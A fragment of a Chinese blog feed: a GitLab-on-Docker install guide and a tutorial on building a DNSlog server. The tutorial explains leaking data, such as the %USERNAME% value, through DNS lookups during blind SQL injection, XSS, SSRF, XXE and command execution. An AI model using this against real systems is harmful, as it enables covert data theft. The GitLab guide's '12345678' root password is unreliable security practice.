href="https://pm3.echo.cool/index.php/2019/08/03/rfid%e6%96%b0%e6%89%8b%e5%85%a5%e5%9d%91%e6%8c%87%e5%8d%97-%e8%ae%be%e5%a4%87%e7%af%87/">https://pm3.echo.cool/index.php/2019/08/03/rfid%e6%96%b0%e6%89%8b%e5%85%a5%e5%9d%91%e6%8c%87%e5%8d%97-%e8%ae%be%e5%a4%87%e7%af%87/</a></p><p><a href="https://pm3.echo.cool/index.php/2022/03/14/rfid%e8%ae%be%e5%a4%87%e8%b4%ad%e4%b9%b0%e6%8c%87%e5%8d%97/">https://pm3.echo.cool/index.php/2022/03/14/rfid%e8%ae%be%e5%a4%87%e8%b4%ad%e4%b9%b0%e6%8c%87%e5%8d%97/</a></p><p><a href="https://ulyc.github.io/2020/01/18/%E5%B8%B8%E8%A7%81RFID%E5%8D%A1%E7%89%87%E4%BB%8B%E7%BB%8D-%E7%A0%B4%E8%A7%A3%E6%80%9D%E8%B7%AF-%E5%8F%8A-Proxmark3%E7%AE%80%E4%BB%8B/">https://ulyc.github.io/2020/01/18/%E5%B8%B8%E8%A7%81RFID%E5%8D%A1%E7%89%87%E4%BB%8B%E7%BB%8D-%E7%A0%B4%E8%A7%A3%E6%80%9D%E8%B7%AF-%E5%8F%8A-Proxmark3%E7%AE%80%E4%BB%8B/</a></p><p><a href="https://pm3.echo.cool/index.php/2019/04/29/%e4%b8%80%e7%af%87%e6%96%87%e7%ab%a0%e8%ae%b2%e6%b8%85%e6%a5%9aid%ef%bc%8cic%ef%bc%8cm1%ef%bc%8ccpu%e5%8d%a1%e7%9a%84%e5%8c%ba%e5%88%ab/">https://pm3.echo.cool/index.php/2019/04/29/%e4%b8%80%e7%af%87%e6%96%87%e7%ab%a0%e8%ae%b2%e6%b8%85%e6%a5%9aid%ef%bc%8cic%ef%bc%8cm1%ef%bc%8ccpu%e5%8d%a1%e7%9a%84%e5%8c%ba%e5%88%ab/</a></p><p><a href="https://www.cnblogs.com/sky-heaven/p/4704895.html">https://www.cnblogs.com/sky-heaven/p/4704895.html</a></p><p><a href="https://www.bilibili.com/video/av374364427/">https://www.bilibili.com/video/av374364427/</a></p><p><a href="https://blog.csdn.net/TonnyBrown/article/details/75200601">https://blog.csdn.net/TonnyBrown/article/details/75200601</a></p><p><a href="https://4hou.win/wordpress/?paged=13&amp;cat=17">https://4hou.win/wordpress/?paged=13&amp;cat=17</a></p>]]></content>
      
      
      <categories>
          
          <category> 无线 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RFID </tag>
            
            <tag> 无线 </tag>
            
            <tag> 物联网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gitlab_docker安装使用</title>
      <link href="/2022/03/24/gitlab-docker%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/03/24/gitlab-docker%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="gitlab-docker安装使用"><a href="#gitlab-docker安装使用" class="headerlink" title="gitlab_docker安装使用"></a>gitlab_docker安装使用</h1><h2 id="docker环境安装"><a href="#docker环境安装" class="headerlink" title="docker环境安装"></a>docker环境安装</h2><ol><li>安装或更新WSL2<br>之前在Windows10中我们是通过开启Hyper-V组件来进行Docker的安装，随着微软不断完善WSL以及WSL2的推出，现在完全可以不开启Hyper-V来直接进行Docker的安装。一般的Windows10系统中默认以及安装WSL，我们只需要通过下载一个 wsl_update_x64.msi</li></ol><ul><li><p>开启BIOS虚拟化<br>进入主机BIOS界面找到虚拟化设置开启</p></li><li><p>启用wsl<br>以管理员身份打开 PowerShell 工具并运行以下命令<br><code>dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart</code></p></li><li><p>启用“虚拟机平台”<br>要在 Windows 10（2004）上启用虚拟机平台，请以管理员身份打开 PowerShell 并运行：</p></li></ul><p><code>dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</code><br>要在 Windows 10（1903，1909）上启用虚拟机平台，请以管理员身份打开 PowerShell 并运行：</p><p><code>Enable-WindowsOptionalFeature -Online -FeatureName VirtualMachinePlatform -NoResta</code></p><ul><li>设置 WSL 2 为默认值<br>以管理员身份打开 PowerShell，然后运行以下命令以将 WSL 2 设置为 WSL 的默认版本：</li></ul><p><code>wsl --set-default-version 2</code></p><ol start="2"><li><p>安装 Docker Desktop<br>点击<a href="https://hub.docker.com/editions/community/docker-ce-desktop-windows%20">此处</a>来下载最新的Docker Desktop Installer来安装Docker ,安装完成后需要重新启动电脑。</p></li><li><p>检查是否正确安装Docker<br>重启计算机后，看桌面右下角的Docker图标是否已经启动，如果已经正常启动在cmd中通过docker ps 命令来看是否已运行Docker。 </p></li></ol><h2 id="gitlab安装"><a href="#gitlab安装" class="headerlink" title="gitlab安装"></a>gitlab安装</h2><ol><li>创建数据卷Volume<br>如果没有正确创建数据卷，你会发现每当你的电脑重启后，你之前做的所有的操作保存的数据全部都清除了这是因为你的数据都是保存在Docker镜像里面的，并没有将Docker里面的数据同步到系统中任何一个磁盘中，所以当你执行Docker stop或者是Docker restart命名后之前所有的数据都丢失了<br>执行的命名是 ：docker volume create XXX ,后面是数据卷的名称<br>如果放在C盘空间不够，可以在其它盘创建<br><img src="/2022/03/24/gitlab-docker%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/192d248fd4a840a79c1d33aa68dbfb5d.png"></li></ol><p>这里由于GitLab中主要有三个重要的数据分别是 data、config、log，所以我们这里创建了三个数据卷，后面GitLab服务都是挂在在这几个目录下面的。</p><ol start="2"><li>执行Docker run步骤<br>映射对应的端口和目录<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">docker run -d  -p <span class="number">443</span>:<span class="number">443</span> -p <span class="number">80</span>:<span class="number">80</span> -p <span class="number">8888</span>:<span class="number">22</span> --name gitlab --restart always -v d:<span class="regexp">/gitlab-config-vol:/</span>etc<span class="regexp">/gitlab -v d:gitlab-log-vol:/</span>var<span class="regexp">/log/gi</span>tlab</span><br><span class="line">-v d:gitlab-data-vol:<span class="regexp">/var/</span>opt<span class="regexp">/gitlab -e  ITLAB_ROOT_EMAIL="root@local"-e GITLAB_ROOT_PASSWORD="gitlab_root_password" -e EXTERNAL_URL="http:/</span><span class="regexp">/自己的ip或网址" gitlab/gi</span>tlab-ce</span><br></pre></td></tr></tbody></table></figure></li></ol><p>-d  后台运行容器，并返回容器ID<br>-p 80:80  将容器内80端口映射至宿主机80端口，这是访问gitlab的端口<br>-p 8888:22  将容器内22端口映射至宿主机8888端口，这是访问ssh的端口<br>–name gitlab 设置容器名称为gitlab<br>–restart always  容器自启动<br>-v gitlab-config-vol:/etc/gitlab  将容器/etc/gitlab目录挂载到创建的数据卷 gitlab-config-vol目录下<br>–privileged=true  让容器获取宿主机root权限<br>gitlab/gitlab-ce  镜像的名称，这里也可以写镜像ID　</p><p>安装完成后我们通过<code>docker ps -a</code> 命令查看我们安装的docker 镜像 ，这样就是正确启动起来了，这样我们就完成了一大步</p><ol start="3"><li>配置GitLab服务<br>这个步骤主要是配置GitLab在局域网中访问的Url以及端口，这个主要是方便局域网中进行浏览器的访问，这个过程主要是通过修改容器内GitLab服务来实现的，具体来说是修改GitLab默认的配置文件gitlab.rb来进行的，具体的步骤如下</li></ol><ul><li>进入容器内执行命令<br><code>docker exec -it gitlab /bin/bash</code></li><li>使用vi编辑器打开gitlib.rb,具体命令如下：<br><code>vi /etc/gitlab/gitlab.rb</code></li></ul><p>3.3 修改gitlab.rb中的重点配置项</p><figure class="highlight vala"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta"># gitlab访问地址，可以写域名。如果端口不写的话默认为80端口</span></span><br><span class="line">eaxternal_url <span class="string">'http://127.0.0.1:80'</span></span><br><span class="line"><span class="meta"># ssh主机ip</span></span><br><span class="line">gitlab_rails[<span class="string">'gitlab_ssh_host'</span>] = <span class="string">'127.0.0.1'</span></span><br><span class="line"><span class="meta"># ssh连接端口</span></span><br><span class="line">gitlab_rails[<span class="string">'gitlab_shell_ssh_port'</span>] = <span class="number">443</span></span><br></pre></td></tr></tbody></table></figure><p>配置了这个后我们就可以在浏览器中通过127.0.0.1或者是localhost去访问GitLab服务了</p><ul><li><p>保存并推出</p><figure class="highlight elixir"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 保存并退出</span></span><br><span class="line"><span class="symbol">:wq</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>设置下默认账号的密码</p><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">cd <span class="regexp">/opt/gi</span>tlab<span class="regexp">/bin/</span></span><br><span class="line">gitlab-rails console production</span><br><span class="line">u=User.where(id:<span class="number">1</span>).first</span><br><span class="line">u.password=<span class="number">12345678</span></span><br><span class="line">u.password_confirmation=<span class="number">12345678</span></span><br><span class="line">u.save!</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>让修改后的配置生效<br><code>gitlab-ctl reconfigure</code></p></li><li><p>重启GitLab服务<br><code>gitlab-ctl restart</code></p></li><li><p>退出容器<br><code>exit</code></p></li></ul><p><img src="/2022/03/24/gitlab-docker%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/ee6d39f8cbd34a52ab30c25aef636c79.png"></p><h2 id="gitlab使用"><a href="#gitlab使用" class="headerlink" title="gitlab使用"></a>gitlab使用</h2><p>管理员用户授权权限<br><img src="/2022/03/24/gitlab-docker%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/3a85777f2fc647bbb60c379aa15f23b1.png"></p><h3 id="创建gitlab项目"><a href="#创建gitlab项目" class="headerlink" title="创建gitlab项目"></a>创建gitlab项目</h3><p>1）选择projects –&gt;Creare a project 创建一个项目<br><img src="/2022/03/24/gitlab-docker%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/13003376ef4246a4a6668aa6d69cb569.png"><br>填写项目名称,Project slug自动补充。（Project description(optional)项目描述自定义）其他默认，点击确定</p><p>a. 项目名称，项目名称可以为字母、数字、空格、下划线、中划线和英文点号组</p><p>成，且必须以字母或数字开头，不能使用中文</p><p>b. 项目描述</p><p>c. 可见性（库类别）</p><p>私有库：只有被赋予权限的用户可见</p><p>内部库：登录用户可以下载</p><p>公开库：所有人可以下载<br><img src="/2022/03/24/gitlab-docker%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/759146b40bd149b0bf9cd07e425e35f1.png"></p><p>点击创建，如下图</p><p>项目地址有HTTP和SSH两种方式——-可发送给开发人员下载和初始化项目<br><img src="/2022/03/24/gitlab-docker%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/d6013ee18bca431e90bb646cfa4f691b.png"></p><p>如果通过SSH方式拉取推送项目代码必须要导入SSH key<br><img src="/2022/03/24/gitlab-docker%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/e0ebd4b2300b4fb8b0809975a98ce667.png"></p><p><img src="/2022/03/24/gitlab-docker%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/c79c0adb526347b4a2507d3ef20076dd.png"></p><p>点击key后出现如下图片，将下面步骤生成的key文件复制到框中<br><img src="/2022/03/24/gitlab-docker%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/ad810aa9d2aa47c3849b2b43ae4695f8.png"></p><h3 id="key生成"><a href="#key生成" class="headerlink" title="key生成"></a>key生成</h3><p><code>ssh-keygen -t rsa -f ~/.ssh/gitlab_id_rsa-C "lx@qq.com"</code><br>可以使用已创建的key或者自己生成key，生成key如下（执行命令后直接回车，我之前已经执行过此命令并生成了 id_rsa key）：<br>想要同时配置github和gitlab,则要配置.ssh的config文件<br>一般在C:\Users\用户名.ssh下<br><img src="/2022/03/24/gitlab-docker%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/9e97d231bac54312916ffd6ff03957b7.png"><br>config的配置</p><figure class="highlight crmsh"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># gitlab</span></span><br><span class="line">Host gitlab</span><br><span class="line">HostName <span class="number">192.168</span>.<span class="number">40.7</span></span><br><span class="line">Port <span class="number">8888</span></span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/gitlab_id-rsa</span><br><span class="line"><span class="keyword">User</span> <span class="title">nihao</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># github</span></span><br><span class="line">Host github.com</span><br><span class="line">HostName github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line"><span class="keyword">User</span> <span class="title">nihao</span></span><br></pre></td></tr></tbody></table></figure><h3 id="上传项目"><a href="#上传项目" class="headerlink" title="上传项目"></a>上传项目</h3><p>所有步骤都需要执行的命令</p><figure class="highlight verilog"><table><tbody><tr><td class="code"><pre><span class="line">git <span class="keyword">config</span> --<span class="keyword">global</span> user<span class="variable">.name</span> <span class="string">"Jicming"</span></span><br><span class="line">git <span class="keyword">config</span> --<span class="keyword">global</span> user<span class="variable">.email</span> <span class="string">"412098342@qq.com"</span></span><br></pre></td></tr></tbody></table></figure><ul><li>情况1）创建一个新的git仓库 步骤如下：<figure class="highlight crmsh"><table><tbody><tr><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">git</span>@gitlab.com:newOCS/my_test.git</span><br><span class="line">cd my_test</span><br><span class="line">touch README.md</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m <span class="string">"add README"</span></span><br><span class="line">git push -u origin <span class="literal">master</span></span><br></pre></td></tr></tbody></table></figure></li></ul><ul><li><p>情况2）目录已存在的情况</p><figure class="highlight routeros"><table><tbody><tr><td class="code"><pre><span class="line">cd existing_folder</span><br><span class="line">git init</span><br><span class="line">git remote <span class="builtin-name">add</span> origin git@gitlab.com:newOCS/my_test.git</span><br><span class="line">git <span class="builtin-name">add</span> .</span><br><span class="line">git commit -m <span class="string">"Initial commit"</span></span><br><span class="line">git push -u origin master</span><br></pre></td></tr></tbody></table></figure></li><li><p>已存在git仓库</p></li></ul><figure class="highlight vim"><table><tbody><tr><td class="code"><pre><span class="line">existing git repository</span><br><span class="line"><span class="keyword">cd</span> existing_repo</span><br><span class="line">git remote <span class="built_in">rename</span> origin old-origin</span><br><span class="line">git remote <span class="built_in">add</span> origin git@gitlab.<span class="keyword">com</span>:newOCS/my_test.git</span><br><span class="line">git push -<span class="keyword">u</span> origin --<span class="keyword">all</span></span><br><span class="line">git push -<span class="keyword">u</span> origin --<span class="keyword">tags</span></span><br></pre></td></tr></tbody></table></figure><p>参考：<br><a href="https://zhuanlan.zhihu.com/p/337104547">https://zhuanlan.zhihu.com/p/337104547</a><br><a href="https://www.cnblogs.com/seekdream/p/14197062.html">https://www.cnblogs.com/seekdream/p/14197062.html</a><br><a href="https://zhuanlan.zhihu.com/p/47823511">https://zhuanlan.zhihu.com/p/47823511</a><br><a href="https://www.jianshu.com/p/68578d52470c">https://www.jianshu.com/p/68578d52470c</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> git </tag>
            
            <tag> gitlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNSlog工具原理搭建及使用</title>
      <link href="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>DNSlog工具原理搭建及使用</p><h1 id="DNSlog工具原理搭建及使用"><a href="#DNSlog工具原理搭建及使用" class="headerlink" title="DNSlog工具原理搭建及使用"></a>DNSlog工具原理搭建及使用</h1><h2 id="DNSlog是什么"><a href="#DNSlog是什么" class="headerlink" title="DNSlog是什么"></a>DNSlog是什么</h2><p>DNS就是将域名解析为ip，用户在浏览器上输入一个域名A.com，就要靠DNS服务器将A.com解析到它的真实ip127.0.0.1，这样就可以访问127.0.0.1服务器上的相应服务。 那么DNSlog是什么。DNSlog就是存储在DNS服务器上的域名信息，它记录着用户对域名<a href="http://www.baidu.com等的访问信息,类似日志文件./">www.baidu.com等的访问信息，类似日志文件。</a></p><h2 id="DNSlog回显原理"><a href="#DNSlog回显原理" class="headerlink" title="DNSlog回显原理"></a>DNSlog回显原理</h2><h3 id="域名分级与域名解析过程-DNS"><a href="#域名分级与域名解析过程-DNS" class="headerlink" title="域名分级与域名解析过程(DNS)"></a>域名分级与域名解析过程(DNS)</h3><p>因特网采用层次树状结构命名方法。域是名字空间中一个可被管理的划分（按机构组织划分），域可被划分为子域，子域可再被划分，即形成了顶级域名、二级域名、三级域名等。从右向左为顶级域名、二级域名、三级域名等，用点隔开。如：<br>tieba.baidu.com</p><p>它由三个标号组成， com即为顶级域名，baidu为二级域名，tieba即为三级域名。且域名不分区大小写。<br><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/9b68c684bd7b4ba98cc71145d03da3a8.png"></p><p>比如说,我注册了一个为luomiweixiong.com的域名,我将 它的a记录泛解析到139.x.x.x上,这样就实现了无论我记录值填什么他都有解析,并且都指向139.x.x.x,当我向dns服务器发起test.luomiweixiong.com的解析请求时,DNSlog中会记录下他给test.luomiweixiong.com解析,解析值为139.x.x.x.</p><h2 id="免费的平台"><a href="#免费的平台" class="headerlink" title="免费的平台"></a>免费的平台</h2><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>www.dnslog.cn</span><br><span class="line">http:<span class="regexp">//</span>admin.dnslog.link</span><br><span class="line">http:<span class="regexp">//</span>ceye.io</span><br></pre></td></tr></tbody></table></figure><h3 id="http-www-dnslog-cn使用方法"><a href="#http-www-dnslog-cn使用方法" class="headerlink" title="http://www.dnslog.cn使用方法"></a><a href="http://www.dnslog.cn使用方法/">http://www.dnslog.cn使用方法</a></h3><p>（1）Get SubDomain的意思是获取子域名，这里点击完就给我们一个三级域名。复制完后，打开新网页并粘贴在url上，访问<br><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/0d82524f5ab2467ea007e7797fcd2799.png"></p><p>（2）在本机实验演示<br>ping命令的时候会用到DNS解析<br><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/c9a5d440f1c146cd93c5e2eb0aa10120.png"><br>ping命令的时候会用到DNS解析<br><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/8b2c969551b84ae693dabb7483636855.png"></p><p>解析的日志会把%USERNAME%的值给带出来，因为系统在ping命令之前会将%USERNAME%的值解析出来，然后再和a.com拼接起来，最后ping命令执行将XF.a.com一起发给DNS服务器请求解析域名对应的ip地址，这个过程被记录下来就是DNSlog。<br>原理上只要能进行DNS请求的函数都可能存在DNSlog注入。</p><p>dns缓存可能造成记录不刷新，此时更换新的域名即可。</p><p>其它平台同理。</p><h2 id="DNSlog使用的地方"><a href="#DNSlog使用的地方" class="headerlink" title="DNSlog使用的地方"></a>DNSlog使用的地方</h2><p>目标不让信息显示出来，如果能发送请求，那么就可以尝试咱这个办法——用DNSlog来获取回显<br>（1）SQL注入中的盲注<br>（2）XSS盲打<br>（3）无回显的命令执行<br>（4）无回显的SSRF<br>（5）无回显的XXE（Blind XXE）</p><h2 id="搭建自己的dnslog平台"><a href="#搭建自己的dnslog平台" class="headerlink" title="搭建自己的dnslog平台"></a>搭建自己的dnslog平台</h2><p>前提：一台公网ip的VPS和一个域名</p><ol><li>域名利用freenom网站或eu.org或pp.ua注册即可</li></ol><ol start="2"><li>利用Cloudflare进行解析<br>因为Freenom本地的解析在国内不够好用，咱们就换个。<br>注册cloudflare账号</li></ol><p>配置你的域名</p><p>配置NameServer,指向CloudFlare。</p><p>xxx.ns.cloudflare.com<br>xxx.ns.cloudflare.com</p><p><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/ab25f88fe2b0412d8815a2b6b840ac2d.png"></p><p><strong>配置NS记录</strong></p><p>分别申请两个DNS记录，NS记录代表子域名log.where.cf的DNS服务器为ns.where,cf</p><p><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/bd9d272584b048068138f91cdf029472.png"></p><p>测试是否生效<br>网上python2的dns脚本</p><figure class="highlight routeros"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> twisted.internet import reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names import client, dns, error,<span class="built_in"> server</span></span><br><span class="line"><span class="built_in"></span>record={}</span><br><span class="line">class DynamicResolver(object):</span><br><span class="line">    def _doDynamicResponse(self, query):</span><br><span class="line">        name = <span class="string">"query.name.name"</span> #修改域名 </span><br><span class="line">        # 返回指定应答IP</span><br><span class="line">       <span class="built_in"> ip </span>= <span class="string">"x.x.x.x"</span></span><br><span class="line">        <span class="builtin-name">print</span>(name+<span class="string">" ===&gt; "</span>+ip)</span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            <span class="attribute">name</span>=name,</span><br><span class="line">            <span class="attribute">type</span>=dns.A,</span><br><span class="line">            <span class="attribute">cls</span>=dns.IN,</span><br><span class="line">            <span class="attribute">ttl</span>=0, # 这里设置DNS TTL为 0</span><br><span class="line">            <span class="attribute">payload</span>=dns.Record_A(address=b'%s'%ip,ttl=0)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        return answers, authority, additional</span><br><span class="line">    def query(self, query, <span class="attribute">timeout</span>=None):</span><br><span class="line">        return defer.succeed(self._doDynamicResponse(query))</span><br><span class="line">def main():</span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(<span class="attribute">resolv</span>=<span class="string">'/etc/resolv.conf'</span>)]</span><br><span class="line">    )</span><br><span class="line">    protocol = dns.DNSDatagramProtocol(<span class="attribute">controller</span>=factory)</span><br><span class="line">    reactor.listenUDP(53, protocol)</span><br><span class="line">    reactor.<span class="builtin-name">run</span>()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    raise SystemExit(main())</span><br></pre></td></tr></tbody></table></figure><p>python2和pip在ubuntu中安装</p><figure class="highlight dsconfig"><table><tbody><tr><td class="code"><pre><span class="line"><span class="string">add-apt-repository</span> <span class="string">universe</span></span><br><span class="line"><span class="string">apt</span> <span class="string">update</span> </span><br><span class="line"><span class="string">apt</span> <span class="string">install</span> <span class="string">python2</span></span><br><span class="line"><span class="string">curl</span> <span class="string">https</span>://<span class="string">bootstrap</span>.<span class="string">pypa</span>.<span class="string">io</span>/<span class="string">pip</span>/<span class="string">2</span>.<span class="string">7</span>/<span class="built_in">get-pip.py</span> <span class="built_in">--output</span> <span class="built_in">get-pip.py</span></span><br><span class="line"><span class="string">python2</span> <span class="built_in">get-pip.py</span></span><br></pre></td></tr></tbody></table></figure><p><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/87c8f3dafee747089f7932ee1f4fe832.png"></p><p><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/43837f9556914a04b831efc331251e52.png"></p><p>注：国内域名可能有需要备案问题</p><ol start="3"><li>如果是云服务器，到防火墙中开放自己的53端口<br>临时解决：<br>53端口被占用，<code>lsof -i:53</code>查看pid，<code>kill -9 pid</code>，ubuntu关闭<code>systemctl stop systemd-resolved</code></li></ol><p>长期生效：<br><code>vim /etc/systemd/resolved.conf</code>,如下图配置，关闭监听。<br><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/ad12406c18914fed89dda111a692dd56.png"><br>接着重启服务, <code>systemctl restart systemd-resolved</code></p><p><code>vim /etc/resolv.conf</code><br><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/a17c2377718d44d8b9c2b83b427a9055.png" alt="e12d16e6bb92c997787d2ddf0f15ac5a.png"></p><ol start="4"><li>部署DNS服务<br>将dnslog的liunx版本从github下载到vps中<br><a href="https://github.com/yumusb/DNSLog-Platform-Golang">https://github.com/yumusb/DNSLog-Platform-Golang</a><br><a href="https://github.com/lanyi1998/DNSlog-GO/releases/">https://github.com/lanyi1998/DNSlog-GO/releases/</a><br><a href="https://github.com/chennqqi/godnslog">https://github.com/chennqqi/godnslog</a></li></ol><p><strong>ubuntu 完全干净的卸载docker</strong></p><figure class="highlight vala"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#docker --version</span></span><br><span class="line">apt-<span class="keyword">get</span> autoremove docker docker-ce docker-engine  docker.io  containerd runc</span><br><span class="line"><span class="meta">#删除docker其他没有没有卸载</span></span><br><span class="line">dpkg -l | grep docker</span><br><span class="line">dpkg -l |grep ^rc|awk <span class="string">'{print $2}'</span> |sudo xargs dpkg -P</span><br><span class="line"><span class="meta">#卸载没有删除的docker相关插件(结合自己电脑的实际情况)</span></span><br><span class="line">apt-<span class="keyword">get</span> autoremove docker-ce-*</span><br><span class="line"><span class="meta">#删除docker的相关配置&amp;目录</span></span><br><span class="line">rm -rf /etc/systemd/system/docker.service.d</span><br><span class="line">rm -rf /<span class="keyword">var</span>/lib/docker</span><br><span class="line"><span class="meta">##删除docker的相关配置&amp;目录</span></span><br><span class="line">docker --version</span><br></pre></td></tr></tbody></table></figure><h3 id="DNSLog-Platform-Golang"><a href="#DNSLog-Platform-Golang" class="headerlink" title="DNSLog-Platform-Golang"></a>DNSLog-Platform-Golang</h3><ol><li><p>下载<br><code>git clone https://github.com/yumusb/DNSLog-Platform-Golang</code></p></li><li><p>编辑配置文件</p><figure class="highlight vim"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> DNSLog-Platform-Golang</span><br><span class="line"><span class="keyword">vi</span> config.tomal</span><br></pre></td></tr></tbody></table></figure></li></ol><figure class="highlight ini"><table><tbody><tr><td class="code"><pre><span class="line"><span class="section">[front]</span></span><br><span class="line"><span class="attr">template</span> = <span class="string">"index.html"</span></span><br><span class="line"><span class="section">[back]</span></span><br><span class="line"><span class="attr">listenhost</span> = <span class="string">"0.0.0.0"</span></span><br><span class="line"><span class="attr">listenport</span> = <span class="number">11111</span></span><br><span class="line"><span class="attr">domains</span> = [ <span class="string">"log.xxx.xx"</span>]</span><br><span class="line"><span class="attr">cname</span> = <span class="string">""</span></span><br><span class="line"><span class="section">[basicauth]</span></span><br><span class="line"><span class="attr">check</span> = <span class="literal">false</span></span><br><span class="line"><span class="attr">username</span> = <span class="string">"yumu"</span></span><br><span class="line"><span class="attr">password</span> = <span class="string">"yumusb"</span></span><br></pre></td></tr></tbody></table></figure><ul><li>前端模板文件</li><li>后端监听的主机、端口、域名、与CNAME响应</li><li>HTTP BASIC AUTH的是否打开（check=true）与密码配置</li></ul><ol start="3"><li>go环境配置<figure class="highlight vim"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> env -<span class="keyword">w</span> GO111MODULE=<span class="keyword">on</span></span><br><span class="line"><span class="keyword">go</span> env -<span class="keyword">w</span></span><br></pre></td></tr></tbody></table></figure>GOPROXY=<a href="https://goproxy.cn,direct/">https://goproxy.cn,direct</a> #可选，国内机器不能上github则需要执行此处以设置{代}{理}<br><code>go run main.go或者nohup  go run main.go &amp;</code></li></ol><p><img src="/2022/01/06/DNSlog%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/2adc4e10f40947479f19482f21e3bd5e.png"></p><h3 id="Knary"><a href="#Knary" class="headerlink" title="Knary"></a>Knary</h3><p>二进制文件部署:</p><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">wget https:<span class="regexp">//g</span>hproxy.com<span class="regexp">/https:/</span><span class="regexp">/github.com/</span>sudosammy<span class="regexp">/knary/</span>releases<span class="regexp">/download/</span>v3.<span class="number">3.1</span>/knary-<span class="number">3.3</span>.<span class="number">1</span>-linux-amd64</span><br><span class="line">chmod +x knary-<span class="number">3.3</span>.<span class="number">1</span>-linux-amd64</span><br><span class="line">mv knary-<span class="number">3.3</span>.<span class="number">1</span>-linux-amd64 knary</span><br><span class="line">./knary</span><br></pre></td></tr></tbody></table></figure><p>如果二进制不安全，可以考虑Docker 